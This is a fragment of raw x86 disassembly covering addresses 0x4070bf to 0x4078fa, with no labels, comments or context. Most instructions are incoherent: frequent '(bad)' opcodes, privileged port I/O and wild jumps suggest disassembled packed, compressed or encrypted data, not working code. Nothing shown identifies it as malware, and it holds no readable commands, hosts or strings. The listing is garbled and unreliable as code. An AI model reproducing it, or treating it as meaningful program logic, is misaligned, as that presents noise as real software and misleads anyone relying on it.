  4070bf:	(bad)  
  4070c0:	jl     0x407105
  4070c2:	pop    ebx
  4070c3:	lods   eax,DWORD PTR ds:[esi]
  4070c4:	ret    
  4070c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070c6:	push   edx
  4070c7:	(bad)  
  4070c8:	mov    esp,0xeeff5a6f
  4070cd:	xchg   esi,eax
  4070ce:	fadd   DWORD PTR [edi]
  4070d0:	fldenv [esi+edx*4]
  4070d3:	(bad)  
  4070d4:	faddp  st(6),st
  4070d6:	xchg   edi,eax
  4070d7:	loopne 0x4070b7
  4070d9:	scas   al,BYTE PTR es:[edi]
  4070da:	push   ecx
  4070db:	inc    DWORD PTR [esp+edx*1-0xf]
  4070df:	pop    ebx
  4070e0:	test   BYTE PTR [edx-0x7841ada2],al
  4070e6:	dec    ebp
  4070e7:	pop    edx
  4070e8:	mov    dh,0x3d
  4070ea:	inc    ecx
  4070eb:	dec    edx
  4070ec:	in     al,0x3d
  4070ee:	inc    esi
  4070ef:	push   edx
  4070f0:	fdiv   QWORD PTR [eax]
  4070f2:	ss push edx
  4070f4:	sahf   
  4070f5:	sub    al,0x75
  4070f7:	cwde   
  4070f8:	add    BYTE PTR [eax],al
  4070fa:	xchg   esi,eax
  4070fb:	cmp    eax,0x4599982e
  407100:	es push edx
  407102:	cdq    
  407103:	adc    DWORD PTR [edx+edx*2+0x7e],0x3d
  407108:	pop    esp
  407109:	arpl   WORD PTR [esi+0x3d],di
  40710c:	push   cs
  40710d:	pop    ebx
  40710e:	xchg   edi,eax
  40710f:	xchg   DWORD PTR [esi],eax
  407111:	push   edx
  407112:	xchg   cx,di
  407115:	pop    ecx
  407116:	pop    esi
  407117:	cmp    eax,0x3d9c6e01
  40711c:	out    dx,al
  40711d:	push   ecx
  40711e:	hlt    
  40711f:	cmp    edx,eax
  407121:	xchg   esp,eax
  407122:	inc    esp
  407123:	cmp    eax,0x3fc451de
  407128:	shl    DWORD PTR [edi-0x52],0x14
  40712c:	jmp    0xe94c646b
  407131:	mov    dh,0xbb
  407133:	das    
  407134:	push   0x48
  407136:	and    eax,0x24dde8aa
  40713b:	cmp    eax,0x6f16fc34
  407140:	pop    ebx
  407141:	push   ecx
  407142:	push   es
  407143:	mov    esp,DWORD PTR [eax+edx*2]
  407146:	mov    DWORD PTR [ecx+ebp*8],edx
  407149:	pusha  
  40714a:	mov    bh,0xab
  40714c:	fistp  DWORD PTR [eax]
  40714e:	jo     0x407164
  407150:	adc    esi,ebp
  407152:	pop    ds
  407153:	shr    eax,cl
  407155:	push   eax
  407156:	fs or  al,0x0
  407159:	cmp    esi,0x6eff5a
  40715f:	add    BYTE PTR [esi-0x29],cl
  407162:	idiv   DWORD PTR [ecx-0x57c94f16]
  407168:	xor    ch,BYTE PTR [edi+eiz*1-0x1c30de2]
  40716f:	adc    al,0xe1
  407171:	jmp    0x4071b3
  407173:	jmp    0x3ef84b82
  407178:	add    BYTE PTR [ecx],cl
  40717a:	sar    BYTE PTR [ebp+0x35458b48],0x6d
  407181:	adc    eax,DWORD PTR [eax]
  407183:	push   ss
  407184:	mov    ds:0xdaf1753c,eax
  407189:	test   BYTE PTR [ecx+0x753ce016],dh
  40718f:	adc    DWORD PTR [eax],eax
  407191:	(bad)  
  407192:	repz push es
  407194:	jle    0x4071aa
  407196:	call   0xff7d33b9
  40719b:	idiv   BYTE PTR [edi+0x40]
  40719e:	call   0xff7d1974
  4071a3:	push   ecx
  4071a4:	push   ecx
  4071a5:	add    eax,0xc6e1e941
  4071aa:	pop    es
  4071ab:	shl    eax,0x3f
  4071ae:	dec    esi
  4071b0:	add    ecx,0x13ffc6fb
  4071b6:	call   0xff7c38fa
  4071bb:	mov    al,ds:0x1400106c
  4071c0:	mov    WORD PTR [eax],gs
  4071c2:	sub    DWORD PTR [ebp-0x518a0000],0xffffffff
  4071c9:	adc    dh,BYTE PTR [eax]
  4071cb:	cmp    esi,DWORD PTR [ebp-0x1f]
  4071ce:	pop    edx
  4071cf:	div    BYTE PTR [ecx+0x458d818e]
  4071d5:	add    BYTE PTR [edi+ebx*2-0x5a500001],ch
  4071dc:	push   0xff5697bd
  4071e1:	addr16 xchg ecx,eax
  4071e3:	sbb    al,0x41
  4071e5:	add    BYTE PTR [edi+0x62],cl
  4071e8:	pop    es
  4071e9:	call   0x3f6050
  4071ee:	pop    edi
  4071ef:	(bad)  
  4071f0:	sti    
  4071f1:	inc    DWORD PTR [ebp+0x2a43e73f]
  4071f7:	in     al,0xfe
  4071f9:	leave  
  4071fa:	dec    edx
  4071fb:	adc    eax,DWORD PTR [eax]
  4071fd:	push   ebp
  4071fe:	adc    ebx,ebx
  407200:	add    ah,0x5c
  407203:	pop    ecx
  407204:	jmp    FWORD PTR [ecx-0x78]
  407207:	in     al,0x74
  407209:	or     BYTE PTR [eax],ah
  40720b:	lods   al,BYTE PTR ds:[esi]
  40720c:	mov    al,0xff
  40720e:	pop    ds
  40720f:	mov    esi,0x17b0fc44
  407214:	add    bh,ch
  407216:	out    dx,al
  407217:	pop    esi
  407218:	shl    BYTE PTR [edi],cl
  40721a:	mov    DWORD PTR [edi],edx
  40721c:	push   0xff5697d8
  407221:	inc    ch
  407223:	ds out 0xaf,eax
  407226:	jno    0x4071f3
  407228:	(bad)  
  407229:	push   0x0
  40722b:	add    BYTE PTR [eax+0x5f],cl
  40722e:	adc    al,0x38
  407230:	or     DWORD PTR [eax],edx
  407232:	push   0xff5147fb
  407237:	(bad)  
  407238:	and    eax,0x841286b
  40723d:	fist   WORD PTR [ebp+0xacadfb7]
  407243:	rol    BYTE PTR [esp+ebp*8+0x67],0xf1
  407248:	out    0x4f,eax
  40724a:	dec    DWORD PTR [edi-0x60]
  40724d:	xor    eax,0xa231ffb7
  407252:	mov    ah,0x67
  407254:	xor    DWORD PTR ds:0x9e59be5e,ebp
  40725a:	pop    ss
  40725b:	inc    ecx
  40725c:	xor    DWORD PTR ds:0x9529754f,ebx
  407262:	sbb    bl,cl
  407264:	into   
  407265:	test   eax,0xb17d565b
  40726a:	dec    esi
  40726b:	inc    DWORD PTR [ecx+ebx*8+0x4e]
  40726f:	jne    0x40729a
  407271:	aad    0x3c
  407273:	mov    cl,0xae
  407275:	leave  
  407276:	cmp    al,0xc2
  407278:	sub    eax,0x8d8ab82d
  40727d:	lods   eax,DWORD PTR ds:[esi]
  40727e:	inc    edi
  40727f:	cld    
  407280:	call   FWORD PTR [ecx+0x5c18ffd9]
  407286:	dec    esi
  407287:	jne    0x4072c2
  407289:	and    eax,0x197eb0db
  40728e:	jge    0x4072d5
  407290:	add    BYTE PTR [eax],al
  407292:	jne    0x407249
  407294:	sbb    BYTE PTR [ebp+0x19],dh
  407297:	ins    BYTE PTR es:[edi],dx
  407298:	add    ecx,DWORD PTR [ebx+0x411b9424]
  40729e:	xor    DWORD PTR [ebp+0x75dd000e],ebp
  4072a4:	(bad)  [eax]
  4072a6:	or     DWORD PTR [ebx+eax*1+0x57],ebp
  4072aa:	pop    ecx
  4072ab:	pushf  
  4072ac:	test   DWORD PTR [eax],eax
  4072ae:	xor    DWORD PTR [esi+0x43],eax
  4072b1:	je     0x4072bf
  4072b3:	sti    
  4072b4:	pop    ebx
  4072b5:	shr    esp,cl
  4072b7:	dec    edx
  4072b8:	dec    esi
  4072b9:	push   0xffc5135b
  4072be:	outs   dx,BYTE PTR ds:[esi]
  4072bf:	arpl   WORD PTR [ecx-0x49],dx
  4072c2:	push   ss
  4072c3:	xor    DWORD PTR [ebx+0x5e2b3167],0xffffffbe
  4072ca:	popa   
  4072cb:	adc    al,0xa6
  4072cd:	fdiv   DWORD PTR [esi]
  4072cf:	sub    al,0xc3
  4072d1:	cmp    dh,dh
  4072d3:	cmp    DWORD PTR [ecx-0x71c65da6],eax
  4072d9:	pop    edx
  4072da:	xor    dl,dl
  4072dc:	push   0x82bf310d
  4072e1:	(bad)
  4072e4:	test   eax,0x6e39ce8c
  4072e9:	dec    esi
  4072ea:	ret    
  4072eb:	push   0x21
  4072ed:	pop    es
  4072ee:	inc    esp
  4072ef:	jg     0x40734f
  4072f1:	fdivr  DWORD PTR [edx+0xfbdc39]
  4072f7:	add    BYTE PTR [esi-0x59b1682f],dl
  4072fd:	fldenv [esi-0x16ef8cc4]
  407303:	mov    eax,0x476a28ab
  407308:	lea    ebp,[esi+0x3920d9e8]
  40730e:	pushf  
  40730f:	sti    
  407310:	xchg   esi,eax
  407311:	sub    ebx,DWORD PTR [ecx+0x4e]
  407314:	jbe    0x4072a1
  407316:	lods   al,BYTE PTR ds:[esi]
  407317:	dec    edi
  407318:	fst    DWORD PTR [ebx]
  40731a:	jmp    0xc6ed1a7d
  40731f:	or     esi,eax
  407321:	adc    edx,DWORD PTR [ecx-0x172ce6e8]
  407327:	dec    esi
  407328:	les    ecx,FWORD PTR [ebx]
  40732a:	add    DWORD PTR [ecx+ebp*2-0x3bb219c7],edx
  407331:	aaa    
  407332:	(bad)  
  407334:	cs sub al,0xe3
  407337:	xchg   edx,eax
  407338:	cmp    DWORD PTR cs:[eax+0x1c142d42],esp
  40733f:	jns    0x40734e
  407341:	xchg   ebx,eax
  407342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407343:	xor    BYTE PTR [esi],bl
  407345:	cmp    DWORD PTR [eax],eax
  407347:	mov    dh,0x8e
  407349:	iret   
  40734a:	sti    
  40734b:	sbb    DWORD PTR [edi+edi*4+0xb],esi
  40734f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407350:	fsubr  DWORD PTR es:[eax]
  407353:	sub    BYTE PTR ds:0x356ccd2c,ch
  407359:	adc    al,0xb
  40735b:	test   eax,0x8fe40000
  407360:	mov    eax,ds:0xc71432e8
  407365:	and    al,0x65
  407367:	adc    al,0x0
  407369:	jmp    0x7585c4a0
  40736e:	je     0x407381
  407370:	add    cl,ch
  407372:	fdivr  DWORD PTR [eax]
  407374:	imul   ebp,ecx,0xe96938d8
  40737a:	das    
  40737b:	iret   
  40737c:	repz mov ecx,0x3ef48f27
  407382:	in     al,dx
  407383:	cmp    BYTE PTR [eax+0x3e],dl
  407386:	jle    0x4073c8
  407388:	(bad)  
  407389:	mov    esp,0x649f2bfe
  40738e:	sub    eax,0x59290b14
  407393:	psubsw mm0,QWORD PTR [ebp-0x7effebcd]
  40739a:	das    
  40739b:	in     al,dx
  40739c:	inc    eax
  40739d:	jmp    0x114c3297
  4073a2:	repz cmp edi,0xd08da2fe
  4073a9:	fs mov dh,0x3f
  4073ac:	imul   esi
  4073ae:	cmc    
  4073af:	jecxz  0x407402
  4073b1:	shl    DWORD PTR [eax-0x4421007f],1
  4073b7:	mov    ?,eax
  4073b9:	fidivr WORD PTR [ebp+0x37]
  4073bc:	call   0xff7835a2
  4073c1:	add    BYTE PTR [eax],al
  4073c3:	add    BYTE PTR [edx+0x305b6810],al
  4073c9:	push   ebx
  4073ca:	(bad)  
  4073cb:	dec    BYTE PTR [ebp-0x2800091d]
  4073d1:	enter  0x5c34,0xe1
  4073d5:	push   edx
  4073d6:	jmp    edi
  4073d8:	add    BYTE PTR [edx-0x71ae0001],ah
  4073de:	in     al,0xf7
  4073e0:	mov    bh,0xc8
  4073e2:	imul   eax,DWORD PTR [eax],0x41377d40
  4073e8:	enter  0xb4c8,0xf0
  4073ec:	dec    edi
  4073ed:	enter  0xfffe,0x7d
  4073f1:	sub    BYTE PTR [bx+di-0x38],al
  4073f5:	fucomi st,st(1)
  4073f7:	mov    ch,0x57
  4073f9:	enter  0x8588,0xf4
  4073fd:	(bad)  
  4073ff:	push   DWORD PTR [edx+0x13]
  407402:	push   0xff533052
  407407:	(bad)  
  407408:	sbb    eax,0x47fff6e3
  40740d:	enter  0x5c34,0x31
  407411:	push   ebx
  407412:	jmp    edi
  407414:	inc    esp
  407415:	sahf   
  407416:	(bad)  
  407417:	inc    DWORD PTR [ecx]
  407419:	mov    gs,eax
  40741b:	test   DWORD PTR [edi-0x38],0xe014858c
  407422:	(bad)  
  407423:	(bad)  
  407424:	mov    eax,0x38635b
  407429:	add    BYTE PTR [ecx+0x48b5ff13],cl
  40742f:	jecxz  0x40742f
  407431:	call   DWORD PTR [edi+0x21]
  407434:	pop    esp
  407435:	sub    DWORD PTR [ecx],ecx
  407437:	adc    al,ch
  407439:	test   eax,0xbfecb9d
  40743e:	xor    DWORD PTR [ebp-0x30],ebp
  407441:	sbb    BYTE PTR [edx+0x1ef72887],dh
  407447:	dec    esi
  407448:	add    BYTE PTR [ebp+0x41],dh
  40744b:	jbe    0x407461
  40744d:	(bad)  
  40744e:	mov    ah,0x4c
  407450:	push   ebx
  407451:	inc    DWORD PTR [esi]
  407453:	sbb    eax,0x6dc3765c
  407458:	dec    ebx
  407459:	jmp    0x407478
  40745b:	inc    edx
  40745c:	inc    ebx
  40745d:	je     0x407496
  40745f:	std    
  407460:	pop    ebx
  407461:	push   0xffffffa3
  407463:	test   DWORD PTR [ebx-0x39],ecx
  407466:	mov    ah,0x8c
  407468:	push   ebx
  407469:	call   esi
  40746b:	pop    edi
  40746c:	add    eax,DWORD PTR [eax]
  40746e:	xor    DWORD PTR [edx-0x5a411b78],ebp
  407474:	dec    edx
  407475:	add    BYTE PTR [ebp+0x76],al
  407478:	xchg   BYTE PTR [ebp-0xb5223b],bh
  40747e:	xor    DWORD PTR [ecx-0x47],ebx
  407481:	and    ah,0xd4
  407484:	push   edx
  407485:	call   FWORD PTR [esi+0x944cf2c]
  40748b:	sub    eax,0xef03
  407490:	iret   
  407491:	std    
  407492:	rol    BYTE PTR [edi],1
  407494:	cdq    
  407495:	jmp    0x407430
  407497:	(bad)  
  407498:	jle    0x407487
  40749a:	nop
  40749b:	in     al,dx
  40749c:	jle    0x4074b3
  40749e:	dec    ebx
  40749f:	jmp    esp
  4074a1:	xor    al,0x5b
  4074a3:	adc    eax,0xff4b0596
  4074a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074a9:	and    al,0x53
  4074ab:	call   DWORD PTR [esi+0x35]
  4074ae:	rol    BYTE PTR [edi],1
  4074b0:	pop    ecx
  4074b1:	and    eax,0x2546ff9a
  4074b6:	nop
  4074b7:	in     al,0x46
  4074b9:	adc    esp,esi
  4074bb:	dec    edx
  4074bc:	ss shl al,0x5b
  4074c0:	sub    BYTE PTR [edi-0x2a],ah
  4074c3:	dec    edx
  4074c4:	es or  cl,0x52
  4074c8:	push   ds
  4074c9:	ss (bad) 
  4074cb:	shr    BYTE PTR [esi],1
  4074cd:	sub    al,0x70
  4074cf:	cdq    
  4074d0:	push   cs
  4074d1:	ss mov dh,0x90
  4074d4:	or     eax,0x94aae3e
  4074d9:	inc    eax
  4074da:	pop    eax
  4074db:	dec    edx
  4074dc:	div    BYTE PTR ds:0x35e65754
  4074e2:	xchg   esi,eax
  4074e3:	pop    ebx
  4074e4:	fild   DWORD PTR [ebx+0x7fde4a8e]
  4074ea:	xchg   ecx,eax
  4074eb:	push   edx
  4074ec:	(bad)  
  4074ed:	xor    eax,0x35802a91
  4074f2:	jbe    0x40753e
  4074f4:	add    BYTE PTR [eax],al
  4074f6:	jl     0x40753c
  4074f8:	jbe    0x407544
  4074fa:	mov    esi,0xb6943d2c
  4074ff:	xor    eax,0x2ba6c05e
  407504:	(bad)  
  407505:	dec    ecx
  407506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407507:	xor    eax,0x2c9ad04e
  40750c:	out    0x7f,eax
  40750e:	xor    DWORD PTR [eax+esi*1],edx
  407511:	inc    ebp
  407512:	cmp    DWORD PTR [esp+ebx*4],edx
  407515:	jle    0x4074ac
  407517:	xchg   ecx,eax
  407518:	and    eax,0x93140b47
  40751d:	div    BYTE PTR [edi-0x41]
  407520:	lock pop ebx
  407522:	push   edi
  407523:	pushw  ss
  407525:	dec    edx
  407526:	mov    eax,0xcadb0ccf
  40752b:	sti    
  40752c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40752d:	add    edx,DWORD PTR [esi-0x41]
  407530:	lock pop ebx
  407532:	daa    
  407533:	ss add dh,dh
  407536:	clc    
  407537:	xor    al,0x75
  407539:	in     eax,dx
  40753a:	call   0x43117cfd
  40753f:	data16 (bad) 
  407541:	fisubr WORD PTR [edx+0x52]
  407544:	add    al,0xe9
  407546:	xlat   BYTE PTR ds:[ebx]
  407547:	mov    esp,ebp
  407549:	push   0x71
  40754b:	cmp    BYTE PTR [edx-0x17],ch
  40754e:	hlt    
  40754f:	and    bh,bh
  407551:	xor    al,0xd
  407553:	sub    eax,0x357887b5
  407558:	mov    DWORD PTR [eax+eax*1],esp
  40755b:	add    BYTE PTR [ecx-0x54],ch
  40755e:	(bad)  
  40755f:	call   0x77a8ebbd
  407564:	cmp    eax,0x6900ffd3
  407569:	cld    
  40756a:	inc    eax
  40756b:	jmp    0x914834d9
  407570:	out    dx,al
  407571:	pop    esi
  407572:	(bad)  
  407573:	jle    0x4075ed
  407575:	mov    edi,0xcf676fb
  40757a:	call   0xff751116
  40757f:	xor    BYTE PTR [edi+0x10],ch
  407582:	add    BYTE PTR [ebp+ebp*1+0x552d8128],dh
  407589:	cmp    eax,0xcf264eff
  40758e:	sti    
  40758f:	cdq    
  407590:	jmp    0x3e7e8153
  407595:	fsubr  DWORD PTR [eax]
  407597:	test   al,0x32
  407599:	sub    al,0x99
  40759b:	push   0x35
  40759d:	adc    al,0xb
  40759f:	sub    DWORD PTR [eax-0x71],edi
  4075a2:	int    0xe8
  4075a4:	xor    dl,BYTE PTR [edi+eax*8]
  4075a7:	lods   al,BYTE PTR ds:[esi]
  4075a8:	cli    
  4075a9:	adc    eax,DWORD PTR [eax]
  4075ab:	jmp    0x85c2e2
  4075b0:	push   esp
  4075b1:	retf   
  4075b2:	push   es
  4075b3:	add    BYTE PTR [eax+0x56],bl
  4075b6:	jmp    FWORD PTR [ecx+0x58]
  4075b9:	push   esi
  4075ba:	jmp    FWORD PTR [ecx+0x48]
  4075bd:	mov    ebp,0xf444
  4075c2:	clc    
  4075c3:	mov    esp,0xdd07f484
  4075c8:	(bad)  
  4075c9:	push   eax
  4075ca:	jmp    DWORD PTR [edx-0x9]
  4075cd:	inc    DWORD PTR [ebp-0x74941824]
  4075d3:	pop    ss
  4075d4:	add    BYTE PTR [ebx],cl
  4075d6:	fsub   DWORD PTR [ebx+0x4]
  4075d9:	jmp    0x408c46
  4075de:	jo     0x4075cb
  4075e0:	daa    
  4075e1:	inc    ecx
  4075e2:	or     ch,bl
  4075e4:	je     0x4075f2
  4075e6:	shr    BYTE PTR [ebp+0x67bfffb3],0x8a
  4075ed:	sar    BYTE PTR [ebp-0x4e],1
  4075f0:	repz imul DWORD PTR [edi-0x5fadb024]
  4075f7:	pop    ebp
  4075f8:	mov    bl,0xff
  4075fa:	aas    
  4075fb:	scas   al,BYTE PTR es:[edi]
  4075fc:	test   al,dh
  4075fe:	inc    edi
  4075ff:	fdiv   st(6),st
  407601:	call   0x3ffcfa
  407606:	sbb    eax,0xfff7d7b2
  40760b:	fisttp DWORD PTR [edi+0x68]
  40760e:	les    ebx,FWORD PTR [edi]
  407610:	inc    ecx
  407611:	add    bh,ch
  407613:	mov    eax,ds:0xdc4ff7f0
  407618:	(bad)  
  407619:	xor    eax,0x410e9c
  40761e:	lock jmp 0x4075d3
  407621:	dec    DWORD PTR [edi-0x52]
  407624:	test   ah,ah
  407626:	add    BYTE PTR [eax],al
  407628:	inc    edi
  407629:	fdiv   st(6),st
  40762b:	push   0x31
  40762d:	cmp    eax,0x7c19a1db
  407632:	add    edi,edi
  407634:	pushf  
  407635:	sub    eax,0x324eff4f
  40763a:	or     eax,0x37c185c
  40763f:	call   0xff8864c4
  407644:	test   al,0xc0
  407646:	push   edi
  407647:	imul   DWORD PTR [esi]
  407649:	push   edx
  40764a:	(bad)  
  40764c:	mov    ss,WORD PTR [esi+0x6231410c]
  407652:	xchg   ecx,eax
  407653:	lock push ds
  407655:	pop    edx
  407656:	inc    edi
  407657:	inc    DWORD PTR [ecx+edx*1+0x1d]
  40765b:	inc    ecx
  40765c:	xor    DWORD PTR [ebp+0x73],edx
  40765f:	mov    bl,0xfe
  407661:	cmp    DWORD PTR [ebp-0x7b],0xff479209
  407668:	mov    esp,0xe6f727b7
  40766d:	mov    DWORD PTR [edi+eiz*2-0x3bbb64],esi
  407674:	xlat   BYTE PTR ds:[ebx]
  407675:	out    dx,eax
  407676:	push   ebx
  407677:	test   esi,0x653546b1
  40767d:	push   esp
  40767e:	(bad)  
  40767f:	call   esi
  407681:	sub    al,0x92
  407683:	push   DWORD PTR [esi+0x48744325]
  407689:	mov    esi,0xdc88
  40768e:	sahf   
  40768f:	leave  
  407690:	inc    esi
  407691:	add    al,0x24
  407693:	sub    eax,0xbfa63046
  407698:	arpl   di,si
  40769a:	mov    ?,ecx
  40769c:	mov    bl,0xe7
  40769e:	inc    esp
  40769f:	lods   eax,DWORD PTR ds:[esi]
  4076a0:	inc    esi
  4076a1:	dec    DWORD PTR [edx-0x24005b8]
  4076a7:	adc    ebp,edi
  4076a9:	mov    bl,0x56
  4076ab:	in     al,0x58
  4076ad:	inc    edi
  4076ae:	pop    dx
  4076b0:	ins    BYTE PTR es:[edi],dx
  4076b1:	data16 xor cl,BYTE PTR fs:[esi]
  4076b5:	icebp  
  4076b6:	push   esi
  4076b7:	xor    ch,cl
  4076b9:	or     BYTE PTR [edi+esi*1+0x134646f6],0x7d
  4076c1:	lds    esi,FWORD PTR [ebx+0x364efd70]
  4076c7:	xor    ch,cl
  4076c9:	iret   
  4076ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076cb:	xchg   ebp,eax
  4076cc:	pushf  
  4076cd:	pop    ebx
  4076ce:	push   ds
  4076cf:	xor    dl,dh
  4076d1:	add    esp,DWORD PTR [ebp-0x5bfbbd40]
  4076d7:	xchg   edi,eax
  4076d8:	mov    eax,ds:0x19320e4e
  4076dd:	inc    edi
  4076de:	mov    esp,0xfe46be38
  4076e3:	cmp    al,0x1b
  4076e5:	xor    esi,esi
  4076e7:	xor    edx,esi
  4076e9:	inc    ebx
  4076ea:	gs enter 0x8869,0x9
  4076ef:	sub    dl,BYTE PTR [esi+0x31000046]
  4076f5:	test   al,0x21
  4076f7:	(bad)  
  4076f9:	xor    DWORD PTR [esi-0xf58317b],edx
  4076ff:	pop    ebx
  407700:	dec    esi
  407701:	xor    BYTE PTR [esi+0x46],0xbe
  407705:	addr16 jge 0x407756
  407708:	mov    dh,0x31
  40770a:	data16 shl BYTE PTR [esi],1
  40770d:	cmp    al,0xa2
  40770f:	xchg   edi,eax
  407710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407711:	xor    DWORD PTR [esi-0x70],edx
  407714:	mov    DWORD PTR [ecx],ebp
  407716:	dec    esi
  407717:	inc    esi
  407718:	xchg   esi,eax
  407719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40771a:	lock pop ebx
  40771c:	fadd   QWORD PTR [eax+0x6786463e]
  407722:	add    BYTE PTR [ecx],dl
  407724:	out    dx,eax
  407725:	xor    bh,bh
  407727:	mov    eax,cs:0xf726f738
  40772d:	xor    BYTE PTR [ebp-0xf],dh
  407730:	or     bh,BYTE PTR [edi+0x30f716ab]
  407736:	mov    ch,0x9
  407738:	out    0x30,eax
  40773a:	inc    DWORD PTR [esi]
  40773c:	popa   
  40773d:	sbb    eax,ebp
  40773f:	rcr    BYTE PTR [esi-0x510900cf],1
  407745:	cmp    bh,dh
  407747:	out    dx,al
  407748:	in     al,dx
  407749:	cmp    edx,DWORD PTR [ebp-0xce8b6a]
  40774f:	xchg   esp,eax
  407750:	mov    DWORD PTR [ecx],ebp
  407752:	call   esi
  407754:	jge    0x4076f4
  407756:	scas   eax,DWORD PTR es:[edi]
  407757:	into   
  407758:	add    BYTE PTR [eax],al
  40775a:	ins    BYTE PTR es:[edi],dx
  40775b:	xor    DWORD PTR [ebp-0xce832f],esi
  407761:	shr    esp,1
  407763:	cmp    edi,0xf06774b6
  407769:	mov    dh,0x6c
  40776b:	xor    eax,ebp
  40776d:	sbb    eax,0x9eff30c4
  407772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407773:	sub    cl,ch
  407775:	sub    esi,DWORD PTR [edi+0x31]
  407778:	dec    DWORD PTR [esi+0x47e82ce6]
  40777e:	mov    dl,0x13
  407780:	add    BYTE PTR [eax+0x1c001c73],dh
  407786:	cmp    BYTE PTR [eax-0x7d],al
  407789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40778a:	popa   
  40778b:	xor    DWORD PTR [ebp-0xb],esi
  40778e:	or     cl,dl
  407790:	jg     0x40777b
  407792:	xor    bl,BYTE PTR [ebx-0x590baebb]
  407798:	test   DWORD PTR [ecx-0x31],0xf700ff81
  40779f:	lods   al,BYTE PTR ds:[esi]
  4077a0:	inc    esp
  4077a1:	cld    
  4077a2:	inc    edi
  4077a3:	popa   
  4077a4:	sti    
  4077a5:	(bad)  
  4077a6:	mov    ebp,0x5475fedc
  4077ab:	int3   
  4077ac:	push   ss
  4077ad:	mov    ebx,0xc00ad717
  4077b2:	mov    esp,0x3c458916
  4077b7:	dec    esi
  4077b8:	dec    DWORD PTR [ebp+ecx*4+0xff4fe0]
  4077bf:	add    ch,cl
  4077c1:	fsub   st,st(7)
  4077c3:	jnp    0x4077e1
  4077c5:	xlat   BYTE PTR ds:[ebx]
  4077c6:	dec    BYTE PTR [ebx]
  4077c8:	or     BYTE PTR [eax+ebp*1+0x68],al
  4077cc:	dec    eax
  4077cd:	and    al,0xee
  4077cf:	mov    esi,0xe8075f17
  4077d4:	mov    cl,0x8c
  4077d6:	(bad)  
  4077d7:	inc    DWORD PTR [edi]
  4077d9:	pop    edi
  4077da:	idiv   edi
  4077dc:	jge    0x40780a
  4077de:	(bad)  
  4077df:	jne    0x4077e1
  4077e1:	int3   
  4077e2:	shr    BYTE PTR [ebx+0x75fed8c7],0xbc
  4077e9:	fdiv   DWORD PTR [esp+edi*8-0x39]
  4077ed:	pop    esi
  4077ee:	pop    es
  4077ef:	call   0x40047f
  4077f4:	(bad)  
  4077f5:	pop    esi
  4077f6:	sti    
  4077f7:	call   0x4001b0
  4077fc:	xchg   ecx,eax
  4077fd:	aad    0x7
  4077ff:	add    BYTE PTR ds:0x8c83ebad,ch
  407805:	retf   
  407806:	push   ebp
  407807:	(bad)  
  407808:	mov    ebp,0xfbade727
  40780d:	xlat   BYTE PTR ds:[ebx]
  40780e:	dec    BYTE PTR [ebx]
  407810:	pop    eax
  407811:	pop    esi
  407812:	add    al,0x5e
  407814:	popa   
  407815:	aad    0x7
  407817:	add    BYTE PTR [ecx],dh
  407819:	mov    eax,0xde01efbd
  40781e:	int    0xb
  407820:	cdq    
  407821:	jbe    0x4077b2
  407823:	inc    DWORD PTR [eax]
  407825:	add    BYTE PTR [esi-0x4af0bcde],al
  40782b:	ret    
  40782c:	add    al,BYTE PTR [eax]
  40782e:	xor    esi,edi
  407830:	int    0xfb
  407832:	pop    ecx
  407833:	loop   0x4077c9
  407835:	jmp    DWORD PTR [esi-0x5c]
  407838:	mov    ebp,0x47905eeb
  40783d:	(bad)  
  40783e:	fdiv   QWORD PTR [eax]
  407840:	inc    ebx
  407841:	jne    0x40788c
  407843:	add    eax,0x2e46ae52
  407848:	ja     0x4078bf
  40784a:	dec    ebp
  40784b:	adc    bh,BYTE PTR [edx-0x3d9ac099]
  407851:	inc    DWORD PTR [ebp+eax*2+0x3d3180c5]
  407858:	push   cs
  407859:	shl    BYTE PTR [ebx+edi*1+0x4caa3d2e],0xac
  407861:	cmc    
  407862:	dec    ecx
  407863:	cld    
  407864:	add    ebp,eax
  407866:	lods   al,BYTE PTR ds:[esi]
  407867:	in     eax,dx
  407868:	add    eax,DWORD PTR [eax]
  40786a:	xor    ch,BYTE PTR [ebp-0x73]
  40786d:	jne    0x407878
  40786f:	aad    0x8
  407871:	cmp    DWORD PTR [eax+0x3d],esi
  407874:	(bad)  
  407876:	inc    esi
  407877:	mov    esp,0x7d2a0003
  40787c:	mov    ecx,0x8d21ca01
  407881:	adc    bh,dh
  407883:	cmp    al,0x3
  407885:	push   eax
  407886:	arpl   WORD PTR [esi+0xe7b8],bp
  40788c:	mov    esi,0xb8e80b2f
  407891:	mov    esi,0x140bff42
  407896:	ror    DWORD PTR [ebx+0x41f9441],0x24
  40789d:	(bad)
  4078a2:	pop    DWORD PTR [ebx+0x4]
  4078a5:	sbb    al,0x51
  4078a7:	push   eax
  4078a8:	fld    TBYTE PTR [esi]
  4078aa:	ds inc ebx
  4078ac:	add    al,0x30
  4078ae:	ss mov ecx,0xbb42e8a
  4078b4:	pop    ecx
  4078b5:	daa    
  4078b6:	push   ebx
  4078b7:	inc    ebx
  4078b8:	cs xchg sp,ax
  4078bb:	das    
  4078bc:	dec    ecx
  4078bd:	add    BYTE PTR [edi+0x43],al
  4078c0:	push   esi
  4078c1:	mov    al,ds:0x3be133a4
  4078c6:	call   0xdf04:0x122e4677
  4078cd:	pop    esp
  4078ce:	sub    ecx,DWORD PTR [ecx+esi*1]
  4078d1:	leave  
  4078d2:	popa   
  4078d3:	xor    BYTE PTR [edx+0x26ade558],dh
  4078d9:	mov    esp,0x1ca442f3
  4078de:	rol    esi,0xcb
  4078e1:	sub    eax,0x30748cce
  4078e6:	push   ecx
  4078e7:	inc    esi
  4078e8:	dec    ecx
  4078e9:	shr    eax,cl
  4078eb:	inc    edx
  4078ec:	test   BYTE PTR [ecx+eax*8],bl
  4078ef:	push   0x0
  4078f1:	add    ch,dh
  4078f3:	sub    eax,0xb5eeadae
  4078f8:	add    al,0xfd
  4078fa:	jno    0x407910
